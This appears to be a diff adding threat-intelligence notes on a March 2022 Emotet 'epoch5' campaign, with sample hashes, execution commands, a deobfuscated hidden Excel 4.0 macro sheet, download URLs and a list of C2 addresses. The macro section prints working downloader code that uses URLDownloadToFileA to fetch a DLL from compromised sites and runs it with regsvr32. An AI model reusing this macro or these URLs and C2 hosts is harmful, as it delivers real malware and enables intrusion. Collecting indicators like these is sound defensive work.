@@ -1,0 +1,111 @@
+Emotet 2022 | epoch5 | 15.03.2022 | 
+
+************************************************************************************************************
+
+.zip 64A0D1D85436F47CA3C166B4478339E5556BBCDBF2FE4F85E73356F1DDD467BE
+.xls e6a359144e5d0a1b0d347dc3cd41aee80a4e6828d465dda7f1966b3445cbc80e
+.dll 860d2d287e3b03b43882abeedb15f25ae24f93700ef887e76557c6bde790914b
+
+************************************************************************************************************
+
+Exec >>
+
+EXCEL.EXE C:\Users\Admin\AppData\Local\Temp\List 275216166.xlsm
+
+regsvr32.exe -s ..\ujg.dll
+
+regsvr32.exe /s C:\Windows\SysWOW64\Stooxjnvwcflzhjp\mokzhzmppdsvdy.zxw
+
+************************************************************************************************************
+
+Hidden Macro Sheet - Obfuscation 
+
+=FORMULA(Tfv!D14,Tfvv!I12)=FORMULA(Ofgeg!P22&Ofgeg!H9&Ofgeg!L2&Ofgeg!B15&Ofgeg!B15&Vedve!E10&Vedve!H13&Ofgeg!F10&Vedve!J6&Tfvv!I12&Ofgeg!L2&Vedve!P12&Urdgv!K22&Vedve!E18&Urdgv!T20&Urdgv!G21,F7)=FORMULA(Ofgeg!P22&Ofgeg!J11&Ofgeg!B18&Ofgeg!P11&"BFVS1"&Urdgv!R10&Ofgeg!H9&Ofgeg!L2&Ofgeg!B15&Ofgeg!B15&Vedve!E10&Vedve!H13&Ofgeg!F10&Vedve!J6&Tfvv!I12&Ofgeg!L2&Vedve!P12&Urdgv!K22&Vedve!F20&Urdgv!T20&Urdgv!G21&Ofgeg!P13,F9)=FORMULA(Ofgeg!P22&Ofgeg!J11&Ofgeg!B18&Ofgeg!P11&"BFVS2"&Urdgv!R10&Ofgeg!H9&Ofgeg!L2&Ofgeg!B15&Ofgeg!B15&Vedve!E10&Vedve!H13&Ofgeg!F10&Vedve!J6&Tfvv!I12&Ofgeg!L2&Vedve!P12&Urdgv!K22&Vedve!G18&Urdgv!T20&Urdgv!G21&Ofgeg!P13,F11)=FORMULA(Ofgeg!P22&Ofgeg!J11&Ofgeg!B18&Ofgeg!P11&"BFVS3"&Urdgv!R10&Ofgeg!H9&Ofgeg!L2&Ofgeg!B15&Ofgeg!B15&Vedve!E10&Vedve!H13&Ofgeg!F10&Vedve!J6&Tfvv!I12&Ofgeg!L2&Vedve!P12&Urdgv!K22&Vedve!H20&Urdgv!T20&Urdgv!G21&Ofgeg!P13,F13)=FORMULA(Ofgeg!P22&Ofgeg!J11&Ofgeg!B18&Ofgeg!P11&"BFVS4"&Urdgv!R10&Ofgeg!H9&Ofgeg!L2&Ofgeg!B15&Ofgeg!B15&Vedve!E10&Vedve!H13&Ofgeg!F10&Vedve!J6&Tfvv!I12&Ofgeg!L2&Vedve!P12&Urdgv!K22&Vedve!I18&Urdgv!T20&Urdgv!G21&Ofgeg!P13,F15)=FORMULA(Ofgeg!P22&Ofgeg!J11&Ofgeg!B18&Ofgeg!P11&"BFVS5"&Urdgv!R10&Ofgeg!H9&Ofgeg!L2&Ofgeg!B15&Ofgeg!B15&Vedve!E10&Vedve!H13&Ofgeg!F10&Vedve!J6&Tfvv!I12&Ofgeg!L2&Vedve!P12&Urdgv!K22&Vedve!J20&Urdgv!T20&Urdgv!G21&Ofgeg!P13,F17)=FORMULA(Ofgeg!P22&Ofgeg!J11&Ofgeg!B18&Ofgeg!P11&"BFVS6"&Urdgv!R10&Ofgeg!H9&Ofgeg!L2&Ofgeg!B15&Ofgeg!B15&Vedve!E10&Vedve!H13&Ofgeg!F10&Vedve!J6&Tfvv!I12&Ofgeg!L2&Vedve!P12&Urdgv!K22&Vedve!K18&Urdgv!T20&Urdgv!G21&Ofgeg!P13,F19)=FORMULA(Ofgeg!P22&Ofgeg!J11&Ofgeg!B18&Ofgeg!P11&"BFVS7"&Urdgv!R10&Ofgeg!H9&Ofgeg!B15&Ofgeg!I17&Ofgeg!I3&Ofgeg!H13&Ofgeg!P11&Ofgeg!K9&Ofgeg!P13&Ofgeg!P7&Ofgeg!P13,F21)=FORMULA(Ofgeg!P22&Ofgeg!H13&Ofgeg!N4&Ofgeg!H13&Ofgeg!H9&Ofgeg!P11&Ofgeg!P15&Ofgeg!H9&Ofgeg!P20&Urdgv!N17&Urdgv!O13&Urdgv!J9&Vedve!N16&Urdgv!H15&Ofgeg!P15&Ofgeg!P13,F23)=FORMULA(Ofgeg!P22&Ofgeg!G24&Ofgeg!H13&Ofgeg!E6&Ofgeg!E11&Ofgeg!G24&Ofgeg!K23&Ofgeg!P11&Ofgeg!P13,F28)
+                                        
+                                        =CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"h"&"ttp"&"s://fit"&"fab"&"the"&"rap"&"y.c"&"o"&"m/Un"&"ti"&"tle"&"d-1/A"&"dRf0"&"Jsn"&"yI/","..\ujg.dll",0,0)
+                                        
+                                        =IF(BFVS1<0, CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"h"&"tt"&"p://al"&"mo"&"iz.c"&"om/ur"&"du/LD"&"lb"&"o5"&"gc"&"4c/","..\ujg.dll",0,0))
+                                        
+                                        =IF(BFVS2<0, CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"h"&"tt"&"p://w"&"ww.e-tac"&"tic"&"s.c"&"o"&"m/w"&"ord"&"pre"&"ss/wp"&"au-b"&"acku"&"p/i8"&"Sv/","..\ujg.dll",0,0))
+                                        
+                                        =IF(BFVS3<0, CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"ht"&"tp://a"&"vrw"&"ork"&"s.c"&"o"&"m/m"&"ai"&"l/tGJ"&"con"&"iBv"&"y59"&"a8"&"1/","..\ujg.dll",0,0))
+                                        
+                                        =IF(BFVS4<0, CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"h"&"tt"&"p://as"&"av"&"e.co"&"m.m"&"x/c"&"gi-bi"&"n/CU"&"a/","..\ujg.dll",0,0))
+                                        
+                                        =IF(BFVS5<0, CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"h"&"ttp"&"s://aq"&"ui"&"no"&"abo"&"gad"&"os.c"&"om.a"&"r/ne"&"wsl"&"et"&"te"&"r/tx"&"9KB"&"b2"&"j/","..\ujg.dll",0,0))
+                                        
+                                        =IF(BFVS6<0, CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"h"&"tt"&"p://a"&"vcs"&"erv"&"ic"&"es-t"&"t.co"&"m/EA"&"NA"&"PI/hs"&"wS"&"V1/","..\ujg.dll",0,0))
+                                        
+                                        =IF(BFVS7<0, CLOSE(0),)
+                                        
+                                        =EXEC("C:\Windows\SysWow64\regsvr32.exe -s ..\ujg.dll")
+                                        
+                                        
+                                        
+                                        
+                                        =RETURN() 
+                      
+
+************************************************************************************************************
+
+.dll distro
+
+https://fitfabtherapy.com/Untitled-1/AdRf0JsnyI/
+http://almoiz.com/urdu/LDlbo5gc4c/
+http://www.e-tactics.com/wordpress/wpau-backup/i8Sv/
+http://avrworks.com/mail/tGJconiBvy59a81/
+http://asave.com.mx/cgi-bin/CUa/
+https://aquinoabogados.com.ar/newsletter/tx9KBb2j/
+http://avcservices-tt.com/EANAPI/hswSV1/
+
+Network
+
+https://186.250.48.5:80/aluSbjWDyhEenAHRVbiONdrA
+
+c2's
+
+51.75.33.122:443
+186.250.48.5:80
+168.119.39.118:443
+207.148.81.119:8080
+194.9.172.107:8080
+139.196.72.155:8080
+78.47.204.80:443
+159.69.237.188:443
+45.71.195.104:8080
+54.37.106.167:8080
+185.168.130.138:443
+37.44.244.177:8080
+185.184.25.78:8080
+185.148.168.15:8080
+128.199.192.135:8080
+37.59.209.141:8080
+103.41.204.169:8080
+185.148.168.220:8080
+103.42.58.120:7080
+78.46.73.125:443
+68.183.93.250:443
+190.90.233.66:443
+5.56.132.177:8080
+62.171.178.147:8080
+196.44.98.190:8080
+168.197.250.14:80
+66.42.57.149:443
+59.148.253.194:443
+104.131.62.48:8080
+191.252.103.16:80
+54.37.228.122:443
+88.217.172.165:8080
+195.77.239.39:8080
+116.124.128.206:8080
+93.104.209.107:8080
+118.98.72.86:443
+217.182.143.207:443
+87.106.97.83:7080
+210.57.209.142:8080
+54.38.242.185:443
+195.154.146.35:443
+203.153.216.46:443
+198.199.98.78:8080
+85.214.67.203:8080
+
